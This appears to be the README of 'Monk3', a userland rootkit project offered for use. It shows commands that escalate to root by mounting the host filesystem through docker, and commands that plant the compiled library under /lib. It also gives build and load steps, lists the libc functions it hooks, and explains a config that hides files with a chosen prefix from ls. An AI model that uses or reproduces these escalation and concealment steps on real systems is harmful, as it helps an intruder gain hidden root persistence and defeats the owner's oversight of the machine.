# Monk3 userland rootkit

### dependencies:
<ul>
    <li>docker</li>
</ul>

### my specs:
<ul>
    <li>Docker version 20.10.10, build tag v20.10.10</li>
    <li>Docker Alpine Linux container kernel version 5.13.19_1</li>
    <li>Void Linux kernel version 5.13.19_1</li>
    <li>gcc (GCC) 10.2.1 20201203</li>
</ul>


# how does it work?
Monk3 uses docker to escalate privileges and have access to the user's file system by mounting the root directory into /mnt and accessing it.

example:
```
cd /
docker run -v /:/mnt -it alpine
cd mnt
ls
```
then creates /lib/librootkit/ where the compiled source (monk3.lib.so) will remain.
```
mkdir /lib/librootkit
mv monk3.lib.so /lib/librootkit/monk3.lib.so
```

# configuration guide
to compile and run monk3, just make sure you have docker installed and that your hostname belongs to the same group as docker<br>
(setup.sh does this for you)

### compile and run rootkit:
```
chmod u=rwx setup.sh
./setup.sh -b
```

### delete and unload rootkit:
```
chmod u=rwx setup.sh
./setup.sh -r
```
## hooked functions:
``` C
struct dirent *(*orig_readdir)(DIR *dir);
struct dirent64 *(*orig_readdir64)(DIR *dir);
static void *(*orig_malloc)(size_t) = NULL;
static int (*orig_main)(int, char **, char **);
```
# developer info
inside the *res* file, you'll find *config.h* with the following content:
``` C
#undef DEBUG
#define PREFIX "monk3"
```
DEGUB is a directive that, when defined, prints out ALL hooks to stderr file descriptor (including the hooked parameters)<br>
PREFIX is a directive that defines what filename prefix will be hidden from *ls*
